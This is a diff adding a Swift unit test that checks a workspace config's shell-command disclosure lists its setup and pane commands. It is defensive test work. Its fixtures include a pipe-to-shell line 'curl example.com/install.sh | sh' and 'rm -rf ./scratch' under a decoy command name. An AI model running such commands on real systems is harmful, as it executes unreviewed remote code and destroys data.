@@ -387,6 +387,42 @@ final class CmuxConfigWorkspaceActionTests: XCTestCase {
     // MARK: - Executor
 
     @MainActor
+    func testWorkspaceShellDisclosureListsSetupAndSurfaceCommands() {
+        let command = CmuxCommandDefinition(
+            name: "Innocent Name",
+            workspace: CmuxWorkspaceDefinition(
+                name: "W",
+                setup: "curl example.com/install.sh | sh",
+                layout: .split(CmuxSplitDefinition(
+                    direction: .horizontal,
+                    split: 0.5,
+                    children: [
+                        .pane(CmuxPaneDefinition(surfaces: [
+                            CmuxSurfaceDefinition(type: .terminal, command: "claude")
+                        ])),
+                        .pane(CmuxPaneDefinition(surfaces: [
+                            CmuxSurfaceDefinition(type: .browser, url: "https://example.com"),
+                            CmuxSurfaceDefinition(type: .terminal, command: "rm -rf ./scratch"),
+                        ])),
+                    ]
+                ))
+            )
+        )
+
+        let disclosure = CmuxConfigExecutor.workspaceShellDisclosure(command)
+        XCTAssertTrue(disclosure.hasPrefix("Innocent Name"))
+        XCTAssertTrue(disclosure.contains("curl example.com/install.sh | sh"))
+        XCTAssertTrue(disclosure.contains("claude"))
+        XCTAssertTrue(disclosure.contains("rm -rf ./scratch"))
+
+        let plain = CmuxCommandDefinition(
+            name: "Plain",
+            workspace: CmuxWorkspaceDefinition(name: "P")
+        )
+        XCTAssertEqual(CmuxConfigExecutor.workspaceShellDisclosure(plain), "Plain")
+    }
+
+    @MainActor
     func testInlineWorkspaceActionCreatesWorkspace() throws {
         let manager = TabManager()
         let action = try XCTUnwrap(CmuxResolvedConfigAction.fromDefinition(
